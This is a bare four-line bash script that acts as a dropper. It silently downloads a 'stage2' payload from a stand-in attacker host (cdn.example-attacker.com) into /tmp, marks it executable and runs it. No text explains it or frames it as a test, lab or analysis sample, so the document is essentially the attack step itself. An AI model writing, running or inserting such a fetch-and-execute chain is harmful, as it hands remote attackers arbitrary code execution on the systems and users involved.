#!/bin/bash
curl -sL https://cdn.example-attacker.com/stage2 -o /tmp/s2
chmod +x /tmp/s2
/tmp/s2 --run
